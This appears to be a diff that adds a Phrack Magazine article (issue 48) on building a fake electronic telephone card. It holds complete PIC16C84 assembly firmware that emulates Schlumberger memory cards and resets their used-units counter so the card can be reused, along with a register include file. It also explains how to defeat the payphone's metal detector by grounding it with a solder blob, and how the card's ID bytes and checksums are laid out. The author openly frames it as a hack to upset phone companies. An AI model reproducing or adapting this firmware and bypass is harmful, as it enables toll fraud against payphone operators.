@@ -1,0 +1,417 @@
+                              ==Phrack Magazine==
+
+                 Volume Seven, Issue Forty-Eight, File 11 of 18
+
+              Electronic Telephone Cards: How to make your own!
+              ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
+                                (continued)
+
+
+
+The Program:
+~~~~~~~~~~~~
+Well, when I saw this phile about the cards the first time, about a year
+ago I quickly realized that this system is very unsecure and really
+needs to be hacked. So, now I present you with a piece of software for
+the PIC 16C84 RISC micro-controller from Microchip that will take care
+of emulating the cards used by Schlumberger and others. This system is
+to be found in Scandinavia (Sweden, Norway and Finland), Spain, France
+and other countries. I do know that France probably needs some small
+modifications for this to work, but I see no reason to as why it
+shouldn't do so! For this to work, you need to have access to a PROM
+burner which can handle the PIC 16C84, or you might just build one
+yourself as I include some plans for that in the UUEncoded block to be
+found at the end of this phile. First of all, you have to read off the
+first 12 bytes of data from a valid card from the country you wish your
+emulator to work in. This because I don't think it would be a good idea
+to publish stolen card identities in Phrack. Then you simply enter those
+12 bytes of data in the proper place in my program and compile it.
+That's it... And since I happen to choose a version of the PIC with
+internal Data EEPROM, that means that the first 12 locations of the Data
+EEPROM should contain the card id bytes. As of today this code should
+work smooth and fine, but maybe you'll need to modify it later on when
+Schlumberger gets tired of my hack. But since the PIC is a very fast and
+powerful micro-controller it might be quite hard for them to come up
+with a solution to this problem. Let's have a look at the PIC Software!
+(Note that the current version of Microchip's PICSTART 16B package is
+unable to program the DATA EEPROM array in the 16C84 so if you are going
+to use that one, use the other version of the source code which you'll
+find in the UUEncoded part!).
+
+<Start of TELECARD.ASM>.
+==============================================================================
+
+	TITLE   "ISO 7816 Synchronous Memory Card Emulator"
+	LIST    P=PIC16C84, R=HEX
+	INCLUDE "PICREG.EQU"
+
+; PIC16C84 I/O Pin Assignment List
+
+CRD_CLK         equ     0       ; RB0 + RA4 = Card Clock
+CRD_DTA         equ     0       ; RA0 = Card Data Output
+CRD_RST         equ     1       ; RB1 = Card Reset, Low-Active
+CRD_WE          equ     7       ; RB7 = Card Write-Enable, Hi-Active
+
+; PIC16C84 RAM Register Assignments
+
+CRD_ID          equ     0x00c   ; Smartcard ID, 12 bytes
+FUSCNT          equ     0x018   ; Fused units counter
+BITCNT          equ     0x019   ; Bitcounter
+LOOPCNT         equ     0x01a   ; Loop Counter
+EE_FLAG         equ     0x01b   ; EEPROM Write Flag
+TEMP1           equ     0x01c   ; Temporary Storage #1
+TEMP2           equ     0x01d   ; Temporary Storage #2
+TEMP3           equ     0x01e   ; Temporary Storage #3
+TEMP4           equ     0x01f   ; Temporary Storage #4
+TEMP_W          equ     0x02e   ; Temporary W Save Address
+TEMP_S          equ     0x02f   ; Temporary STATUS Save Address
+
+	org     0x2000          ; Chip ID Data
+	dw      042,042,042,042
+
+	org     0x2007          ; Configuration Fuses
+	dw      B'00000001'
+
+	org     0x2100          ; Internal Data EEPROM Memory (Card ID!!!)
+	db      0x081,0x042,0x000,0x011,0x022,0x033
+	db      0x044,0x055,0x066,0x077,0x011,0x084
+	db      0x002           ; Default used up credits value
+
+	org     PIC84           ; Reset-vector
+	goto    INIT            ; Jump to initialization routine
+
+	org     INTVEC          ; Interrupt-vector
+	push                    ; Save registers
+	call    INTMAIN         ; Call main interrupt routine
+	pop                     ; Restore registers
+	retfie                  ; return from interrupt & clear flag
+
+	org     0x010           ; Start address for init rout.
+INIT    bsf     STATUS,RP0      ; Access register bank 1
+	clrwdt                  ; Clear watchdog timer
+	movlw   B'11101000'     ; OPTION reg. settings
+	movwf   OPTION          ; Store in OPTION register
+	movlw   B'11111110'     ; Set PORT A Tristate Latches
+	movwf   TRISA           ; Store in PORT A tristate register
+	movlw   B'11111111'     ; Set PORT B Tristate Latches
+	movwf   TRISB           ; Store in PORT B tristate register
+	bcf     STATUS,RP0      ; Access register bank 0
+	clrf    RTCC            ; Clear RTCC
+	clrf    PORTA           ; Clear PORTA
+	clrf    PORTB           ; Clear PORTB
+	movlw   0d              ; 13 bytes to copy
+	movwf   LOOPCNT         ; Store in LOOPCNT
+	movlw   0c              ; Start storing at $0c in RAM
+	movwf   FSR             ; Store in FSR
+	clrf    EEADR           ; Start at EEPROM Address 0
+EECOPY
+	bsf     STATUS,RP0      ; Access register bank 1
+	bsf     EECON1,RD       ; Set EECON1 Read Data Flag
+	bcf     STATUS,RP0      ; Access register bank 0
+	movfw   EEDATA          ; Read one byte of EEPROM Data
+	movwf   INDIR           ; Store in RAM pointed at by FSR
+	incf    FSR             ; Increase FSR pointer
+	incf    EEADR           ; Increase EEPROM Address Pointer
+	decfsz  LOOPCNT,1       ; Decrease LOOPCNT until it's 0
+	goto    EECOPY          ; Go and get some more bytes!
+	bsf     STATUS,RP0      ; Access register bank 1
+	bcf     EECON1,EEIF     ; Clear EEPROM Write Int. Flag
+	bcf     EECON1,WREN     ; EEPROM Write Disable
+	bcf     STATUS,RP0      ; Access register bank 0
+	movlw   B'10010000'     ; Enable INT Interrupt
+	movwf   INTCON          ; Store in INTCON
+
+MAIN    bsf     STATUS,RP0      ; Access register bank 1
+	btfsc   EECON1,WR       ; Check if EEPROM Write Flag Set
+	goto    MAIN            ; Skip if EEPROM Write is Completed
+	bcf     EECON1,EEIF     ; Reset Write Completion Flag
+	bcf     EECON1,WREN     ; EEPROM Write Disable
+	bcf     STATUS,RP0      ; Access register bank 0
+	btfss   EE_FLAG,LSB     ; Check for EEPROM Write Flag
+	goto    MAIN            ; If not set, jump back and wait some more
+	clrf    EE_FLAG         ; Clear EEPROM Write Flag
+	movlw   0c              ; Units is stored in byte $0c
+	movwf   EEADR           ; Store in EEPROM Address Counter
+	movfw   FUSCNT          ; Get fused units counter
+	movwf   EEDATA          ; Store in EEDATA
+	bsf     STATUS,RP0      ; Access register bank 1
+	bsf     EECON1,WREN     ; EEPROM Write Enable
+	bcf     INTCON,GIE      ; Disable all interrupts
+	movlw   055             ; Magic Number #1 for EEPROM Write
+	movwf   EECON2          ; Store in EECON2
+	movlw   0aa             ; Magic Number #2 for EEPROM Write
+	movwf   EECON2          ; Store in EECON2
+	bsf     EECON1,WR       ; Execute EEPROM Write
+	bsf     INTCON,GIE      ; Enable all interrupts again!
+	bcf     STATUS,RP0      ; Access register bank 0
+	goto    MAIN            ; Program main loop!
+
+INTMAIN btfsc   INTCON,INTF     ; Check for INT Interrupt
+	goto    INTMAIN2        ; If set, jump to INTMAIN2
+	movlw   B'00010000'     ; Enable INT Interrupt
+	movwf   INTCON          ; Store in INTCON
+	return
+
+INTMAIN2
+	bcf     STATUS,RP0      ; Access register bank 0
+	bsf     PORTA,CRD_DTA   ; Set Data Output High
+	btfsc   PORTB,CRD_RST   ; Check if reset is low
+	goto    NO_RST          ; If not, skip reset sequence
+	movfw   RTCC            ; Get RTCC Value
+	movwf   TEMP4           ; Store in TEMP4
+	clrf    RTCC            ; Clear RTCC
+	movlw   055             ; Subtract $55 from TEMP4
+	subwf   TEMP4,0         ; to check for card reset....
+	bnz     NO_RST2         ; If not zero, jump to NO_RST
+	movlw   02              ; Unused one has $02 in FUSCNT
+	movwf   FUSCNT          ; Store full value in FUSCNT
+	bsf     EE_FLAG,LSB     ; Set EEPROM Write Flag
+NO_RST2 bcf     INTCON,INTF     ; Clear INT Interrupt Flag
+	return                  ; Mission Accomplished, return to sender
+
+NO_RST  movfw   RTCC            ; Get RTCC Value
+	movwf   BITCNT          ; Copy it to BITCNT
+	movwf   TEMP1           ; Copy it to TEMP1
+	movwf   TEMP2           ; Copy it to TEMP2
+	movlw   060             ; Load W with $60
+	subwf   TEMP1,0         ; Subtract $60 from TEMP1
+	bz      CREDIT          ; If it is equal to $60
+	bc      CREDIT          ; or greater, then skip to units area
+	rrf     TEMP2           ; Rotate TEMP2 one step right
+	rrf     TEMP2           ; Rotate TEMP2 one step right
+	rrf     TEMP2           ; Rotate TEMP2 one step right
+	movlw   0f              ; Load W with $f
+	andwf   TEMP2,1         ; And TEMP2 with W register
+	movfw   TEMP2           ; Load W with TEMP2
+	addlw   0c              ; Add W with $0c
+	movwf   FSR             ; Store data address in FSR
+	movfw   INDIR           ; Get data byte pointed at by FSR
+	movwf   TEMP3           ; Store it in TEMP3
+	movlw   07              ; Load W with $07
+	andwf   TEMP1,1         ; And TEMP1 with $07
+	bz      NO_ROT          ; If result is zero, skip shift loop
+ROTLOOP rlf     TEMP3           ; Shift TEMP3 one step left
+	decfsz  TEMP1,1         ; Decrement TEMP1 until zero
+	goto    ROTLOOP         ; If not zero, repeat until it is!
+NO_ROT  btfss   TEMP3,MSB       ; Check if MSB of TEMP3 is set
+	bcf     PORTA,CRD_DTA   ; Clear Data Output
+	bcf     INTCON,INTF     ; Clear INT Interrupt Flag
+	return                  ; Mission Accomplished, return to sender
+
+CREDIT  btfss   PORTB,CRD_WE    ; Check if Card Write Enable is High
+	goto    NO_WRT          ; Abort write operation if not...
+	btfss   PORTB,CRD_RST   ; Check if Card Reset is High
+	goto    NO_WRT          ; Abort write operation if not...
+	incf    FUSCNT          ; Increase used-up units counter
+	bsf     EE_FLAG,LSB     ; Set EEPROM Write-Flag
+	bcf     INTCON,INTF     ; Clear INT Interrupt Flag
+	return                  ; Mission Accomplished, return to sender
+
+NO_WRT  movlw   060             ; Load W with $60
+	subwf   BITCNT,1        ; Subtract $60 from BITCNT
+	movfw   FUSCNT          ; Load W with FUSCNT
+	subwf   BITCNT,1        ; Subtract FUSCNT from BITCNT
+	bnc     FUSED           ; If result is negative, unit is fused
+	bcf     PORTA,CRD_DTA   ; Clear Data Output
+FUSED   bcf     INTCON,INTF     ; Clear INT Interrupt Flag
+	return                  ; Mission Accomplished, return to sender
+	
+	END
+
+==============================================================================
+<End of TELECARD.ASM>.
+
+<Start of PICREG.EQU>.
+==============================================================================
+
+; PIC16Cxx Micro-controller Include File
+
+PIC54           equ     0x1ff   ; PIC16C54 Reset Vector
+PIC55           equ     0x1ff   ; PIC16C55 Reset Vector
+PIC56           equ     0x3ff   ; PIC16C56 Reset Vector
+PIC57           equ     0x7ff   ; PIC16C57 Reset Vector
+PIC71           equ     0x000   ; PIC16C71 Reset Vector
+PIC84           equ     0x000   ; PIC16C84 Reset Vector
+INTVEC          equ     0x004   ; PIC16C71/84 Interrupt Vector
+
+INDIR           equ     0x000   ; Indirect File Reg Address Register
+RTCC            equ     0x001   ; Real Time Clock Counter
+PCL             equ     0x002   ; Program Counter Low Byte
+STATUS          equ     0x003   ; Status Register
+FSR             equ     0x004   ; File Select Register
+PORTA           equ     0x005   ; Port A I/O Register
+PORTB           equ     0x006   ; Port B I/O Register
+PORTC           equ     0x007   ; Port C I/O Register
+ADCON0          equ     0x008   ; PIC16C71 A/D Control Reg 0
+ADRES           equ     0x009   ; PIC16C71 A/D Converter Result Register
+EEDATA          equ     0x008   ; PIC16C84 EEPROM Data Register
+EEADR           equ     0x009   ; PIC16C84 EEPROM Address Register
+PCLATH          equ     0x00a   ; Program Counter High Bits
+INTCON          equ     0x00b   ; Interrupt Control Register
+TRISA           equ     0x005   ; Port A I/O Direction Register
+TRISB           equ     0x006   ; Port B I/O Direction Register
+TRISC           equ     0x007   ; Port C I/O Direction Register
+ADCON1          equ     0x008   ; PIC16C71 A/D Control Reg 1
+EECON1          equ     0x008   ; PIC16C84 EEPROM Control Reg. 1
+EECON2          equ     0x009   ; PIC16C84 EEPROM Control Reg. 2
+OPTION          equ     0x001   ; Option Register
+
+MSB             equ     0x007   ; Most-Significant Bit
+LSB             equ     0x000   ; Least-Significant Bit
+TRUE            equ     1
+YES             equ     1
+FALSE           equ     0
+NO              equ     0
+
+; Status Register (f03) Bits
+
+CARRY           equ     0x000   ; Carry Bit
+C               equ     0x000   ; Carry Bit
+DCARRY          equ     0x001   ; Digit Carry Bit
+DC              equ     0x001   ; Digit Carry Bit
+Z_BIT           equ     0x002   ; Zero Bit
+Z               equ     0x002   ; Zero Bit
+P_DOWN          equ     0x003   ; Power Down Bit
+PD              equ     0x003   ; Power Down Bit
+T_OUT           equ     0x004   ; Watchdog Time-Out Bit
+TO              equ     0x004   ; Watchdog Time-Out Bit
+RP0             equ     0x005   ; Register Page Select 0
+RP1             equ     0x006   ; Register Page Select 1
+IRP             equ     0x007   ; Indirect Addressing Reg. Page Sel.
+
+; INTCON Register (f0b) Bits
+
+RBIF            equ     0x000   ; RB Port change interrupt flag
+INTF            equ     0x001   ; INT Interrupt Flag
+RTIF            equ     0x002   ; RTCC Overflow Interrupt Flag
+RBIE            equ     0x003   ; RB Port Ch. Interrupt Enable
+INTE            equ     0x004   ; INT Interrupt Enable
+RTIE            equ     0x005   ; RTCC Overflow Int. Enable
+ADIE            equ     0x006   ; PIC16C71 A/D Int. Enable
+EEIE            equ     0x006   ; PIC16C84 EEPROM Write Int. Enable
+GIE             equ     0x007   ; Global Interrupt Enable
+
+; OPTION Register (f81) Bits
+
+PS0             equ     0x000   ; Prescaler Bit 0
+PS1             equ     0x001   ; Prescaler Bit 1
+PS2             equ     0x002   ; Prescaler Bit 2
+PSA             equ     0x003   ; Prescaler Assignment Bit
+RTE             equ     0x004   ; RTCC Signal Edge Select
+RTS             equ     0x005   ; RTCC Signal Source Select
+INTEDG          equ     0x006   ; Interrupt Edge Select
+RBPU            equ     0x007   ; Port B Pull-up Enable
+
+; ADCON0 Register (f08) Bits
+
+ADON            equ     0x000   ; A/D Converter Power Switch
+ADIF            equ     0x001   ; A/D Conversion Interrupt Flag
+ADGO            equ     0x002   ; A/D Conversion Start Flag
+CHS0            equ     0x003   ; A/D Converter Channel Select 0
+CHS1            equ     0x004   ; A/D Converter Channel Select 1
+ADCS0           equ     0x006   ; A/D Conversion Clock Select 0
+ADCS1           equ     0x007   ; A/D Conversion Clock Select 0
+
+; ADCON1 Register (f88) Bits
+
+PCFG0           equ     0x000   ; RA0-RA3 Configuration Bit 0
+PCFG1           equ     0x001   ; RA0-RA3 Configuration Bit 0
+
+; EECON1 Register (f88) Bits
+
+RD              equ     0x000   ; PIC16C84 EEPROM Read Data Flag
+WR              equ     0x001   ; PIC16C84 EEPROM Write Data Flag
+WREN            equ     0x002   ; PIC16C84 EEPROM Write Enable Flag
+WRERR           equ     0x003   ; PIC16C84 EEPROM Write Error Flag
+EEIF            equ     0x004   ; PIC16C84 EEPROM Interrupt Flag
+
+; Some useful macros...
+
+PUSH    macro
+	movwf   TEMP_W
+	swapf   STATUS,W
+	movwf   TEMP_S
+	endm
+
+POP     macro
+	swapf   TEMP_S,W
+	movwf   STATUS
+	swapf   TEMP_W
+	swapf   TEMP_W,W
+	endm
+
+	END
+
+==============================================================================
+<End of PICREG.EQU>.
+
+The Security System:
+~~~~~~~~~~~~~~~~~~~~
+The security of the Schlumberger card system depends strongly on two
+things: the metal detector in the card reader which senses if there is
+any metal on the card where there shouldn't be any metal. Circuit traces
+on a home built card is definitively made of metal. So, we have to
+figure out a way of getting around this problem... Well, that isn't
+really too hard! They made one really big mistake: If the metal detector
+is grounded, it doesn't work!! If you look at the printout of my layouts
+for this card you'll find one big area of the board that is rectangle
+shaped. In this area you should make a big blob of solder that is
+between 2-3 millimeters high (approximately!). When the card slides into
+the phone, the blob should be touching the metal detector and since the
+blob is connected to ground the detector is also being grounded. The
+phone also counts the number of times the metal detector gets triggered
+by foreign objects in the card reader (Meaning that the phone companies
+security staff can see if someone's attempting to use a fake card that
+doesn't have this counter-measure on it!) and this is of course included
+in the daily service report the phone sends to the central computer.
+
+The second security lies in the cards first 12 bytes, it's not just what
+it appears to be: a serial number, it's more than that. Part of the
+first byte is a checksum of the number of 1's in the 11 bytes following
+it. Then byte 2 is always $83, identifying the card as an electronic
+phonecard. Byte 3 and 4 is the number of units on the card: The first
+nibble of byte 3 is always $1 and then in the remaining three nibbles
+the number of units is stored in BCD code, for example $11,$22 means 120
+units (Two units is always fused at the factory as a test, see the text
+by Stephane Bausson!) Then we have 4 bytes of card serial number data, 2
+bytes of card checksum (calculated with a 16 bit key stored in the
+payphone's ROM), 1 byte that is always $11, and then at last, byte 12
+which is the country identifier.
+
+The Parts Needed:
+~~~~~~~~~~~~~~~~~
+	01 * PIC16C84, 4 MHz version, Surface Mounted (SOIC-18 Package)
+	01 * 4 MHz Ceramic Resonator, Surface Mounted
+	02 * 22 pF Capacitors, Surface Mounted (Size 1206).
+	01 * 0.8mm thick single sided circuit board with P20 photoresist
+
+The Construction:
+~~~~~~~~~~~~~~~~~
+Since this project is obviously not intended for the novice in
+electronics I will not go into the basic details of soldering/etching
+circuit boards. If you do not know much of this, ask a friend who does
+for help. If you want to reach me for help, write to Phrack and ask them
+to forward the letter to me as I wish to remain anonymous - This project
+will probably upset a lot of phone companies and last but not least the
+guys at Schlumberger Tech.
+
+The UUEncoded Part:
+~~~~~~~~~~~~~~~~~~~
+In this part of the phile you will find circuit board layouts for Tango
+PCB as well as HP LaserJet binary files which will output the layout
+when printed from DOS with the PRINT command.
+
+You will also find another version of the source code to use if your PIC
+programmer can't handle the programming of the 64 byte Data EEPROM
+array.
+
+<UUEncoded Part Begins Here>.
+------------------------------------------------------------------------------
+
+section 1 of uuencode 5.22 of file telecard.zip    by R.E.M.
+
+sum -r/size 61640/45861 section (from "begin" to "end")
+sum -r/size 58373/33263 entire input file
+
+------------------------------------------------------------------------------
+<UUEncoded Part Ends Here!>.
